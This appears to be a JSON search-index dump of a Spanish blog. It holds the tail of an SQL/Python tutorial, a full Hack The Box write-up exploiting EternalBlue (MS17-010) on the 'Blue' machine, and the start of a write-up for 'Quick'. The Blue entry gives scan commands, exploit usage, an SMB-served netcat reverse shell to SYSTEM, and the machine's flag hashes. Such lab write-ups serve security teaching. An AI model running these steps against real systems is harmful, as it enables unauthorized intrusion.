caso primero ejecutaremos una consulta que nos muestre todo de la tabla clientes Customers, donde el ContactName corresponda al de Hanna Moos.  Podemos observar que nuestra consulta se ejecuta en un periodo de 5ms. Lo siguiente que haremos es crear un indice en el campo ContactName de la tabla Customers.  Ahora si volvemos a ejecutar la consulta anterior, observamos que la consulta esta vez solo tarda 1ms.  Esto no puede parecer notorio a consultas en una escala baja, pero de esta manera los INDICES nos dan una solución con la que podemos alivianar bastante el tiempo de consultas que son muy pesadas. INDICES PRIMARIOS - PRIMARY KEYS #: Los indices primarios, son los ya mencionados PRIMARY KEYS, estos tienen como finalidad el permitirnos identidicar las filas de manera unica. En este caso puntual si seleccionamos los datos de la tabla Customers, los indices primarios serian los valores correspondientes al CustomerID.  INDICES UNICOS - UNIQUE INDEX #: Este tipo de indice garantiza que los valores de una columna sean unicos en una tabla, esto implica que no puede haber duplicados en la columna y por ello al crearlos, ademas de mejorar el rendimiento de nuestras consultas verifica que no existan duplicados ni tampoco valores nulos. Puede aplicarse a uno o varios campos. Para crear este tipo de indice es similar al ordinario, solo que debemos de agregar la palabra UNIQUE y lo vamos a crear en nuestra tabla Employees especificamente en los campos Firtsname y Lastname.  De esta manera lo que vamos a conseguir es que no se permita crear dos registros que tengan el mismo nombre Firtsnamey apellido Lastname. En tal sentido podemos crear registros que tengan distintos nombres y apellidos, pero si tratamos de insertar el mismo nombre y el mismo apellido, logicamente ya que dos personas no pueden tener los mismos datos correspondientes funciona como una especie de validación.  Concluimos que con este tipo de indice ademas que podemos tener un mejor rendimiento en nuestras consultas, tambien nos aseguramos de que no puedan existir valores duplicados. Si lo vemos practicamente en terminos reales es como cuando tratamos de registrarnos con un nombre de usuario y si este ya existe el sistema nos arroja un error, donde nos exige que intentemos con otros nombre de usuario.  Los indices consumen mucho espacio en disco, por ello si creamos demasiados indices podemos generar un impacto negativo, ademas que cuando se hace operaciones de alteracion de una tabla tambien se actualizan los indices y esto relentiza las operaciones de escritura. Por ello debemos de usar indices solo cuando sean necesarios, recomendablemente en consultas que realizamos constantemente o cuando tienen una alta cardinalidad en otras palabras cuando estemos trabajando con muchos indices. Una ultima cosa es que si queremos borrar los indices, debemos usar DROP INDEX.  VISTAS #: Una vista es una representacio virtual de una tabla o de una combinación de tablas, por ello podemos pensar en las vistas como una especie de tabla virtual, estas ademas nos permiten simplificar las consultas especialmente cuando son muy complejas y trabajar sobre estas. Supongamos que queremos trabajar sobre la tabla de clientes Customers, solo si estos son de la ciudad de Madrid o del pais de España, para ello tendriamos que realizar el filtro.  Ahora si nosostros quisieramos trabajar unicamente con estos datos, tendriamos que aplicar condicionales, joins o entre otras a esta misma consulta. Pero lo que podemos hacer seria crear una vista, esto lo hacemos con CREATE VIEW mas el nombre de la vista que le queremos dar y seguidamente usamos AS para luego haces referencia a sobre que tabla crear nuestra vista. En este caso sobre el resultado de nuestra consulta anterior.  Vemos que ahora cambia de color, ya que ahora se almaceno como vista, y en consecuencia podemos trabajar directamente sobre ella como si fuera una tabla.  Ahora seguro puedes pensar que podemos usarlas todo el timpo y simplificarnos las tareas… Pues no siempre por que debemos recordar que al ejecutar la vista, por detras se sigue ejecutando la consulta que la genero, por lo tanto realiza un consumo en disco y si lo aplicamos muchas veces tambien nos dara un problema de rendimiento. Pero nos puede servir muchas ocasiones ya que nos simplifica el estar haciendo la misma consulta para un proposito, lo unico es que si las vamos a utilizar procuremos hacerlo de manera equilibrada. Y una cosa mas para borrar una vista, debemos ejecutar DROP VIEW y el nombre de la vista.  pero aqui una observación y es que si ejecutamos el comando nuevamente nos devuelve un error.  Por ello igualmente que cuando creamos una tabla se recomienda usar el IF EXISTS y de este modo verifica que la vista exista antes de borrarla.  de esta forma ya no nos muestra el error. BLOQUEOS #: Los bloqueos son los mecanismos de la bae de datos, que se utilizan para para controlar el acceso concurrente a la base de datos. Esto para evitar que en el proceso se realizen cambios conflictivos o se acceda al mismo tiempo a los datos. Supongamos tenemos $500 dolares en nuestra cuenta bancaria, pero que pasaria si desde los lugares hacemos un retiro al mismo tiempo, pues lo que sucederia es que nuestra cuenta se quedaria con un valor negativo de -$500 y en vista que eso no puede suceder para ello es que suceden estos mecanismo de bloqueo. Existen dos tipos de bloqueos: BLOQUEOS COMPARTIDOS - SHARED LOCKS #: En este tipo de bloqueo nadie de los usuarios puede escribir, pero si pueden leer. En sintesis cuando nosotros estamos leyendo la base de datos ninguna de las otras conexiones puede escribir, pero si pueden leer. BLOQUEOS RESERVADOS - RESERVED LOCKS #: Es este tipo de bloqueo se aplica cuando estamos escribiendo en la base de datos y en ese momento las otras conexiones no pueden escribir pero si pueden leer. BLOQUEOS EXCLUSIVOS - EXCLUSIVE LOCKS #: En este tipo de bloqueos se da cuando mientras estamos escribiendo, las demas conexiones no puedan leer y tampoco puedan escribir, o en un caso mas especifico podemos manipularnos segun nos convenga. TRANSACCIONES - BEGIN TRANSACTION #: Son una secuencia de operaciones que se consideran como una unidad logica, estas aseguran que todas las operaciones dentro de ellas se completen de manera exitosa o por el contrario se deshagan en caso de erro. Para iniciar una nueva transaccion usamos BEGIN TRANSACTION o solo BEGIN. Despues podemos hacer la alteración que queramos en las tablas de la base de datos, por ejemplo puedo cambiar el nombre a un producto, en este caso a Chang y renombrarlo como Refrescos. Como son consultas separadas debemos hay que separarlas con un ;.  Despues de ejecutar la consulta y visualizamos que se cambia el nombre del producto.  Es aqui donde entran a las transacciones ya que si bien realizamos el cambio, tenemos dos opciones la primera es que si estamos seguros de guardar los cambios ejecutemos COMMIT, pero en caso de existir un error y queramos volver a la acción anterior y no se efectuen ROLLBACK. Primero ejecutamos COMMIT, de esta manera se efectuan los cambios.  Ahora supongamos que por error modificamos los nombres de todos los productos.  Verificamos y efectivamente se realizaron los cambios.  Podriamos pensar que hemos arruinado nuestra base de datos, pero ya que iniciamos una transacción, como mencionaba anteriormente con ROLLBACK, podemos restaurar los cambios, de modo tal que estos no se guarden.  Y de esta manera ya tenemos claro primero debemos iniciar una transacción con BEGIN, y una vez se haaya iniciado podemos ejecutar la consulta que queramos de modo tal que si despues queremos guardar los cambio ejecutar un COMMIT, y si de lo contrario queremos resturarlos usamos ROLLBACK. PROCEDIMIENTOS ALMACENADOS #: Es un conjunto de instrucciones que se almancenan en la base de datos y que podemos ejecutarlos cuando queramos para reducir la repetición del codigo, mejora la seguridad por que se limita el acceso directo a la base de datos y aumenta el rendimiento ya que estas operaciones se ejecutan en el servidor de la propia base de datos. sqlite3 se caracteriza por ser ligero de y facil implementación ya ejecuta como una biblioteca y por lo tanto no soporta procedimientos almacenados por que en principio no los necesita ya que se integra directamente en la aplicación que lo utiliza lo que facilita su portabilidad y en consecuencia es sencillo implementarlo en distintas plataformas y sistemas operativos. Por lo tanto cuando queremos ejecutar procedimientos almacenados con sqlite3 lo hacemos desde el backend o lenguaje anfitrion a nivel de aplicación, usando las funciones del lenguaje y aunque estas funciones que podamos definir no son iguales a las de los procedimientos almacenados viene a ser la solución a este problema. SQL Y PYTHON #: Como mencionamos anteriormente en el apartado anterior necesitamos de un lenguaje para ejecutar nuestras funciones definidas por el usuario y para ello usaremos nada mas y nada menos que Python. FUNCIONES DEFINIDAS POR EL USUARIO - USER DEFINED FUNCTIONS #: Son funciones que podemos crear y utilizar dentro de nuestras consultas SQL. Estas funciones permiten ampliar las funcionalidades de SQLite realizando calculos o manipulaciones de datos especificos que no estas directamente disponibles en las funciones integradas. Y para ello para definir estas funciones utilizaremos Python. Comenzaremos importando la libreria de SQLite. import sqlite3Despues crearemos una función, en este caso una que nos devuelva el 20% de un valor que reciba como parametro. def calcular_porcentaje(valor):  porcentaje = valor * 0. 20  return porcentajeYa que tenemos nuestra función, ahora procederemos a crear una conexión con nuestra base de datos en este caso Northwind. db y la guardaremos en la variable conn. Ojo se debe espeficiar la ruta en donde tengas la db. conn = sqlite3. connect( Northwind. db )Ahora tenemos que registrar nuestra función en nuestra conexión conSQLite, para ello usamos el metodo create_function y como primer parametro especificamos el nombre que tendra la función en SQLite que puedes llamarla como quieras, en este caso la llamare Porcentaje, despues como segundo valor debemos espeficar el numero de parametros de nuestra función creada que en este caso es 1 y finalmente como tercer parametro nuestra función calcular_porcentaje. conn. create_function( porcentaje , 1, calcular_porcentaje)Una vez ya tengamos registrada nuestra función, ahora necesitamos crear es algo que nos permite hacer una consulta a la base de datos y obtener una respuesta con todos los datos ya procesados y para ello en Python, tenemos algo que se llaman cursores que nos devolveran los resultados ya formateados. Asi que creamos un cursor y lo guardamos en la variable cursor. cursor = conn. cursor()Lo siguiente es ejecutar la consulta y eso lo hacemos con cursor. execute y dentro podemos ejecutar la consulta que queramos, para este caso vamos a hacer una consulta donde vamos a seleccionar el nombre de los productos de la tabla Products, el precio normal y ademas nuevamente el precio pero en este es donde vamos a ejecutar nuestra función porcentaje. cursor. execute('SELECT ProductName, porcentaje(Price) FROM PRODUCTS')Los resultados de la consulta vamos a almacenarlos en la variable resultados y para obtenerlos usaremos el metodo fetchall() que se utiliza para recuperar todas las filas del conjunto de resultados de una consulta. En el caso en el que solo quisieramos recuperar solo una fila, usariamos fetchone(). Como en este caso queremos el resultado de varias filas usamos fetchall() resultados = cursor. fetchall()Finalmente cerrar el cursor y la conexión para liberar los recursos usados. cursor. close()conn. close()Y ahora si imprimimos los resultados, nos lo devolvera en crudo, de tal forma que no sera bien legible. Para solucionar este problema usaremos otra libreria de Python llamada pandas y con ellas vamos a exportar el resultado en un dataframe que basicamente nos permitira mostrar la información en una especie de tablas. Por lo tanto nuestro codigo completo nos quedaria asi: import sqlite3import pandas as pddef calcular_porcentaje(valor):  porcentaje = valor * 0. 20  return porcentajeconn = sqlite3. connect( Northwind. db )conn. create_function( porcentaje , 1, calcular_porcentaje)cursor = conn. cursor()cursor. execute('SELECT ProductName, Price, porcentaje(Price) FROM PRODUCTS')resultados = cursor. fetchall()df_resultados = pd. DataFrame(resultados)print(df_resultados)cursor. close()conn. close()Al ejecutar nos da como resultado de una majera mas legible los resultados.  Todo esto que acabamos de hacer es una transacción, ya que estas se inician por el lenguaje anfitrion, tras bambalinas lo que esta haciendo Python es hacer un BEGIN automaticamente, entonces una vez que realizamos toda la conexión si queremos que se guarden los cambios hay que usar exacto un COMMIT y de esta manera hubieramos ejecutado correctamente la conexión. Pero existe una manera mas sencilla y optima para hacer exactamente lo mismo, esto nos ayudaria a simplificar nuestro codigo y evitar estar cerrando estas conexiones. Para esto tendriamos que usar with y manejar los errores con un Try Catch. Voy a explicar como funciona y por que es mas optimo usar esta opción - aunque en el curso de Python veremos esto a detalle: Bueno principalmente es mas optimo, puesto que cuando usamos with para conectarnos a la base de datos nos va a garantizar que la conexión se cierre automaticamente al finalizar el bloque de codigo y nos asegura que los recursos de la conexión que establecimos se liberen correctamente aunque ocurran exepciones. Pero para estar seguro tambien usaremos un Try Catch, donde manejaremos las exepciones en el caso pueda existir alguna: Como primera exepción usamos sqlite3. Error que capturara los errores especificos de SQLite de haberlos y nos mostrara a cual corresponde en pantalla. Despues una exepción general con Exception, si es que el problema no se da necesariamente con SQLite y de esta manera tambien nos lo reporte al ocurrir. import sqlite3import pandas as pddef calcular_porcentaje(valor):  porcentaje = valor * 0. 20  return porcentajeTry:  with sqlite3. connect( Northwind. db ) as conn:    conn. create_function( porcentaje , 1, calcular_porcentaje)    cursor = conn. cursor()    cursor. execute('SELECT ProductName, Price, porcentaje(Price) FROM PRODUCTS')    resultados = cursor. fetchall()    df_resultados = pd. DataFrame(resultados)    print(df_resultados)except sqlite3. Error as e:  print( Error en la base de datos:  , e)except Exception as e:  print( Error global:  , e)Ahora para cerrar el cursor, vamos a realizar un ejemplo un poco mas complejo igual desde Python donde de nuestra base de datos trataremos de obtener los 3 empleados que generaron mas ingresos en general. Para ello primero armaremos la estructura de nuestro codigo y importaremos la libreria matplotlib para visualizarlo los resultados graficamente y esta vez como estamos usando pandas vamos a usar una función que nos permite leer una consulta SQL la cual es pd. read_sql_query import sqlite3import pandas as pdimport matplotlib. pyplot as pltconsulta = '''  '''with sqlite3. connect( Northwind. db ) as conn:  resultado = pd. read_sql_query(query, conn)resultado. plot(x=, y=, kind= bar , figzise=(10,5), legend=False)plt. title( Empleado que genero mas Ingresos )plt. xlabel( Nombre Empleado )plt. ylabel( Monto Total Vendido )plt. xticks(rotation=45)plt. show()Vamos a explicarlo paso a paso: Con pd. read_sql_query que recibe dos parametros, en el primero lo que hacemos es que directamente le pasamos la consulta que queramos ejecutar y como segundo parametro la conexión que esta almancenada en conn. Despues usamos la libreria matplotlib. pyplot para crear un plot que se refiere a crear un grafico, donde con x indicaremos y indicaremos los valores bajo los cuales se creara, que aun no los definimos, despues con kind indicamos el tipo de grafico que queremos que tenga, en este caso en barras, figzise para indicarle el tamaño que tendra nuestro grafico y despues con legend si queremos que tenga una leyenda, en este caso no quiero que se vea por ese le pongo false. Despues con plt. title, le damos un nombre a nuestra grafica, plt. xlabel para ponerle un nombre en el eje X y plt. ylabel lo mismo para el eje Y. Despues con xticks le decimos que el nombre del eje X, tenga una rotación de 45 grados para que los nombres no salgan uno encima de otro. Finalmente con plt. show() le decimos que nos muestre el grafico. Ahora en lo que respecta a nuestra consulta, como queremos seleccionar el empleado que genero mas ingresos, primero vamos a seleccionar los datos del empleado y la suma de la cantidad vendida Quantity referente a la tabla OrderDetails por el Precio correspondiente a la tabla Products esto de la tabla Employees Despues vamos a aplicar un JOIN y buscaremos las coincidencias de las tablas partiendo de Employees hasta la tabla OrderDetails donde tenemos la cantidad y a su vez hasta la tabla Products donde tenemos el precio. Esto aunque puede parecer complicado lo haremos basandonos en los ID.  Despues solo debemos agruparlo basandonos en el EmployeeID ya que justamente queremos saber el empleado que genero esos ingresos y finalmente debemos ordenarlo por el total_vendido y establecer un LIMIT de los tres primeros.  Finalmente debemos añadir esa consulta a nuestra variable consulta en nuestro codigo y completar tambien los parametros que faltaban en el plot donde x=Empleado y y=total_vendido. import sqlite3import pandas as pdimport matplotlib. pyplot as pltconsulta = ''' SELECT Firstname ||    || LastName as Empleado, SUM(od. Quantity * p. Price) AS total_vendido FROM Employees e JOIN Orders o ON e. EmployeeID = o. EmployeeID JOIN OrderDetails od ON o. OrderID = od. OrderID JOIN Products p ON od. ProductID = p. ProductID GROUP BY e. EmployeeID ORDER BY total_vendido DESC LIMIT 3'''with sqlite3. connect( Northwind. db ) as conn:  resultado = pd. read_sql_query(query, conn)resultado. plot(x=, y=, kind= bar , figzise=(10,5), legend=False)plt. title( Empleado que genero mas Ingresos )plt. xlabel( Nombre Empleado )plt. ylabel( Monto Total Vendido )plt. xticks(rotation=45)plt. show()El codigo en python nos quedaria de esta manera, ahora solo debemos ejecutarlo y obtendremos graficamente los tres empleados que generaron mas ingresos a la empresa.  Y esto seria todo con respecto al curso de SQL, ahora si estas listo para administrar cualquier base de datos SQL, espero haberte ayudado. 😃 Conmigo sera hasta la proxima vez 😄. "
    }, {
    "id": 27,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Blue",
    "title": "Maquina Blue - htb writeup",
    "body": "2023/06/17 - El dia de hoy vamos a resolver Blue de hackthebox una maquina windows de dificultad facil, donde explotaremos la famosa vulerabilidad Eternalblue que afecta a una versión vulnerable del protocolo smb y mediante la cual podremos realizar ejecución remota de comandos RCE , esto lo haremos manualmente para comprender mejor la explotación de esta vulnerabilidad y de esta manera ganaremos acceso como el usuario nt authority\system. Esta maquina es divertida asi que a darle!. Vamos a comenzar como siempre creando un directorio con el nombre de la maquina: ❯ mkdir Blue❯ ls BlueSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsENUMERACION #: Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 40PING 10. 10. 10. 40 (10. 10. 10. 40) 56(84) bytes of data. 64 bytes from 10. 10. 10. 40: icmp_seq=1 ttl=127 time=146 ms--- 10. 10. 10. 40 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 146. 307/146. 307/146. 307/0. 000 msVemos que la maquina nos responde, con un ttl de 127 correspondiente a una maquina windows, ahora procederemos a el escaneo de puertos con la ayuda de nmap: ESCANEO DE PUERTOS:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 40 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-06-18 02:52 GMTInitiating SYN Stealth Scan at 02:52Scanning 10. 10. 10. 40 [65535 ports]Discovered open port 445/tcp on 10. 10. 10. 40Discovered open port 139/tcp on 10. 10. 10. 40Discovered open port 135/tcp on 10. 10. 10. 40Discovered open port 49153/tcp on 10. 10. 10. 40Discovered open port 49152/tcp on 10. 10. 10. 40Discovered open port 49156/tcp on 10. 10. 10. 40Discovered open port 49155/tcp on 10. 10. 10. 40Discovered open port 49154/tcp on 10. 10. 10. 40Discovered open port 49157/tcp on 10. 10. 10. 40Completed SYN Stealth Scan at 02:52, 20. 40s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 40Host is up, received user-set (0. 22s latency). Scanned at 2023-06-18 02:52:13 GMT for 20sNot shown: 65193 closed tcp ports (reset), 333 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE   REASON135/tcp  open msrpc    syn-ack ttl 127139/tcp  open netbios-ssn syn-ack ttl 127445/tcp  open microsoft-ds syn-ack ttl 12749152/tcp open unknown   syn-ack ttl 12749153/tcp open unknown   syn-ack ttl 12749154/tcp open unknown   syn-ack ttl 12749155/tcp open unknown   syn-ack ttl 12749156/tcp open unknown   syn-ack ttl 12749157/tcp open unknown   syn-ack ttl 127Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 20. 51 seconds      Raw packets sent: 99432 (4. 375MB) | Rcvd: 83167 (3. 327MB)ESCANEO DE VERSION Y SERVICIOS. : ❯ nmap -sCV -p135,139,445,49152,49153,49154,49155,49156,49157 10. 10. 10. 40 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-06-18 03:00 GMTNmap scan report for 10. 10. 10. 40Host is up (0. 31s latency). PORT   STATE SERVICE   VERSION135/tcp  open msrpc    Microsoft Windows RPC139/tcp  open netbios-ssn Microsoft Windows netbios-ssn445/tcp  open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)49152/tcp open msrpc    Microsoft Windows RPC49153/tcp open msrpc    Microsoft Windows RPC49154/tcp open msrpc    Microsoft Windows RPC49155/tcp open msrpc    Microsoft Windows RPC49156/tcp open msrpc    Microsoft Windows RPC49157/tcp open msrpc    Microsoft Windows RPCService Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: |  date: 2023-06-18T03:01:39|_ start_date: 2023-06-18T02:43:00| smb2-security-mode: |  2. 1: |_  Message signing enabled but not required| smb-security-mode: |  account_used: guest|  authentication_level: user|  challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb-os-discovery: |  OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6. 1)|  OS CPE: cpe:/o:microsoft:windows_7::sp1:professional|  Computer name: haris-PC|  NetBIOS computer name: HARIS-PC\x00|  Workgroup: WORKGROUP\x00|_ System time: 2023-06-18T04:01:42+01:00|_clock-skew: mean: -19m57s, deviation: 34m36s, median: 0sService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 79. 42 secondsVisulizamos información interesante de los puertos escaneados y que el equipo corresponde a una maquina Windows 7:       Puerto   Servicio   Versión         135   RPC   Microsoft Windows RPC       139   LDAP   Microsoft Windows netbios-ssn       445   SMB   Windows 7 Professional 7601 Service Pack 1 microsoft       49152-49157   MSRPC   Microsoft Windows RPC   EXPLOTACION #: Vamos a comenzar utilizando los scripts internos de nmap vuln and safe, para activar el escaneo de vulnerabilidades de forma segura. ❯ nmap --script  vuln and safe  -p445 10. 10. 10. 40 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-06-18 03:07 GMTNmap scan report for 10. 10. 10. 40Host is up (0. 13s latency). PORT  STATE SERVICE445/tcp open microsoft-dsHost script results:| smb-vuln-ms17-010: |  VULNERABLE:|  Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)|   State: VULNERABLE|   IDs: CVE:CVE-2017-0143|   Risk factor: HIGH|    A critical remote code execution vulnerability exists in Microsoft SMBv1|    servers (ms17-010). |      |   Disclosure date: 2017-03-14|   References:|    https://blogs. technet. microsoft. com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/|    https://cve. mitre. org/cgi-bin/cvename. cgi?name=CVE-2017-0143|_   https://technet. microsoft. com/en-us/library/security/ms17-010. aspxNmap done: 1 IP address (1 host up) scanned in 4. 50 secondsEl escaneo nos reporta que el servicio es vulnerable a MS17-010 que corresponde a una ejecución remota de comandos. Para explotar esta vulnerabilidad vamos a usar un exploit del repositorio de github de worawit:  https://github. com/worawit/MS17-010Vamos a clonar el repositorio y dentro observaremos varios scripts en python. ❯ git clone https://github. com/worawit/MS17-010Clonando en 'MS17-010'. . . remote: Enumerating objects: 183, done. remote: Total 183 (delta 0), reused 0 (delta 0), pack-reused 183Recibiendo objetos: 100% (183/183), 113. 61 KiB | 476. 00 KiB/s, listo. Resolviendo deltas: 100% (102/102), listo. ❯ cd MS17-010❯ ls shellcode   eternalblue_exploit7. py  eternalchampion_leak. py  eternalromance_leak. py  eternalsynergy_leak. py  mysmb. py     zzz_exploit. py BUG. txt    eternalblue_exploit8. py  eternalchampion_poc. py   eternalromance_poc. py   eternalsynergy_poc. py   npp_control. py  checker. py  eternalblue_poc. py     eternalchampion_poc2. py  eternalromance_poc2. py  infoleak_uninit. py    README. mdUsaremos el checker. py para poder enumerar los namedpipes vulnerables.  Named Pipe: Una named pipe es un canal de comunicaciones half-duplex o full-duplex entre un servidor pipe y uno o más clientes. Todas las instancias de una named pipe comparten el mismo nombre, pero cada instancia tiene sus propios búfers y handles y tienen conductos separados para la comunicación cliente-servidor. ❯ python2 checker. py 10. 10. 10. 40Target OS: Windows 7 Professional 7601 Service Pack 1The target is not patched=== Testing named pipes ===spoolss: STATUS_ACCESS_DENIEDsamr: STATUS_ACCESS_DENIEDnetlogon: STATUS_ACCESS_DENIEDlsarpc: STATUS_ACCESS_DENIEDbrowser: STATUS_ACCESS_DENIEDAl ejecutarlo vemos que no nos reporta un named pipe vulnerable, asi que vamos a abrir el checker. py y vamos a ingresar en las credenciales de invitado guest.  ❯ python2 checker. py 10. 10. 10. 40Target OS: Windows 7 Professional 7601 Service Pack 1The target is not patched=== Testing named pipes ===spoolss: STATUS_OBJECT_NAME_NOT_FOUNDsamr: Ok (64 bit)netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint))lsarpc: Ok (64 bit)browser: Ok (64 bit)Esta vez si nos reporta named pipes vulnerables, lo siguiente ahora es usar uno de estos en conjunto con el script zzz_exploit. py donde tambien asignaremos el usuario guest al igual que en el checker. py ❯ python2 zzz_exploit. pyzzz_exploit. py &lt;ip&gt; [pipe_name]Dentro de zzz_exploit. py, vamos a introducior el codigo que queremos ejecutar en la maquina victima. El cual nos entablara una conexión a nuestra maquina usando el nc. exe que ofreceremos mediante un recurso compartido en nuestra maquina.  Para ello primero vamos a descargarnos el ejecutable de nc. exe de:  https://eternallybored. org/misc/netcat/Concretamente el netcat 1. 12, lo descomprimimos y usaremos el nc64. exe. ❯ unzip netcat-win32-1. 12. zip -d netcatArchive: netcat-win32-1. 12. zip inflating: netcat/doexec. c      inflating: netcat/getopt. c      inflating: netcat/netcat. c      inflating: netcat/generic. h     inflating: netcat/getopt. h      inflating: netcat/hobbit. txt     inflating: netcat/license. txt    inflating: netcat/readme. txt     inflating: netcat/Makefile      inflating: netcat/nc. exe       inflating: netcat/nc64. exe     ❯ cd netcat❯ ls doexec. c  generic. h  getopt. c  getopt. h  hobbit. txt  license. txt  Makefile  nc. exe  nc64. exe  netcat. c  readme. txt❯ rm nc. exe❯ mv nc64. exe nc. exeAhora ofrecemos un recurso compartido con el nombre de smbFolder y nos ponemos en escucha en el puerto 443. ❯ impacket-smbserver smbFolder $(pwd) -smb2supportImpacket v0. 9. 24 - Copyright 2021 SecureAuth Corporation[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3. 0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1. 0[*] Config file parsed[*] Config file parsed[*] Config file parsedEjecutamos en zzz_exploit. py en conjunto con uno de los named pipes validos, es posible que el exploit deba ejecutarse varias veces. ❯ python2 zzz_exploit. py 10. 10. 10. 40 samrTarget OS: Windows 7 Professional 7601 Service Pack 1Target is 64 bitGot frag size: 0x10GROOM_POOL_SIZE: 0x5030BRIDE_TRANS_SIZE: 0xfa0CONNECTION: 0xfffffa800328a7c0SESSION: 0xfffff8a008eed2e0FLINK: 0xfffff8a0081e5088InParam: 0xfffff8a00818a15cMID: 0x803unexpected alignment, diff: 0x5a088leak failed. . . try againCONNECTION: 0xfffffa800328a7c0SESSION: 0xfffff8a008eed2e0FLINK: 0xfffff8a0081df088InParam: 0xfffff8a003aa715cMID: 0x803unexpected alignment, diff: 0x4737088leak failed. . . try againCONNECTION: 0xfffffa800328a7c0SESSION: 0xfffff8a008eed2e0FLINK: 0xfffff8a0081f8088InParam: 0xfffff8a0081f115cMID: 0x803unexpected alignment, diff: 0x6088leak failed. . . try againCONNECTION: 0xfffffa800328a7c0SESSION: 0xfffff8a008eed2e0FLINK: 0xfffff8a008210088InParam: 0xfffff8a00820a15cMID: 0x903success controlling groom transactionmodify trans1 struct for arbitrary read/writemake this SMB session to be SYSTEMoverwriting session security contextcreating file c:\pwned. txt on the targetOpening SVCManager on 10. 10. 10. 40. . . . . Creating service ijHA. . . . . Starting service ijHA. . . . . The NETBIOS connection with the remote host timed out. Removing service ijHA. . . . . ServiceExec Error on: 10. 10. 10. 40nca_s_proto_errorDoneDespues de unos segundos se realiza la petición a nuestro recurso compartido. ❯ impacket-smbserver smbFolder $(pwd) -smb2supportImpacket v0. 9. 24 - Copyright 2021 SecureAuth Corporation[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3. 0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1. 0[*] Config file parsed[*] Config file parsed[*] Config file parsed[*] Incoming connection (10. 10. 10. 40,49158)[*] AUTHENTICATE_MESSAGE (\,HARIS-PC)[*] User HARIS-PC\ authenticated successfully[*] :::00::aaaaaaaaaaaaaaaa[*] Connecting Share(1:IPC$)[*] Connecting Share(2:smbFolder)[-] Unknown level for query path info! 0xfy recibimos la conexión directamente como el usuario nt authority\system. ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 40. Ncat: Connection from 10. 10. 10. 40:49159. Microsoft Windows [Version 6. 1. 7601]Copyright (c) 2009 Microsoft Corporation.  All rights reserved. C:\Windows\system32&gt;whoamiwhoamint authority\systemELEVACION DE PRIVILEGIOS #: Buscamos de forma recursiva y visualizamos la primera flag user. txt. C:\Users&gt;cd C:\Users\haris\Desktopcd C:\Users\haris\DesktopC:\Users\haris\Desktop&gt;type user. txttype user. txt33a8d822f06436dc6144f0a0bbe9a6ebFinalmente nos dirigimos al directorio del usuario Administrador y visualizamos la segunda flag root. txt C:\Users&gt;cd C:\Users\Administrator\Desktopcd C:\Users\Administrator\DesktopC:\Users\Administrator\Desktop&gt;type root. txttype root. txtefa091a0be11892c7056beb574c5bd87"
    }, {
    "id": 28,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Quick",
    "title": "Maquina Quick - htb writeup",
    "body": "2023/06/16 - El dia de hoy vamos a estar resolviendo Quick de hackthebox una maquina potente linux de dificultad hard, donde vamos a estar obtener informacion a traves del http3 compilando una version de curl, con la información obtenida vamos a computar correos para mediante fuerza bruta ganar acceso a un pandel de tickets donde explotaremos una vulnerabilidad en esigate que nos permitira realizar RCE para ganar acceso al sistema. En la parte de elevación de privilegios nos aprovecharemos de la mala configuración de una impresora, para secuestrar el contenido que imprime y modificarlo para obtener información y migrar a otro usuario y ya como este podremos leer el contenido de un archivo de configuración que nos dara las credenciales del usuario root. Es una maquina bastante entretenida asi que a darle!. Vamos a comenzar como siempre creando un directorio con el nombre de la maquina: ❯ mkdir Quick❯ ls QuickSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsEnumeración #: Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 186PING 10. 10. 10. 186 (10. 10. 10. 186) 56(84) bytes of data. 64 bytes from 10. 10. 10. 186: icmp_seq=1 ttl=63 time=118 ms--- 10. 10. 10. 186 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 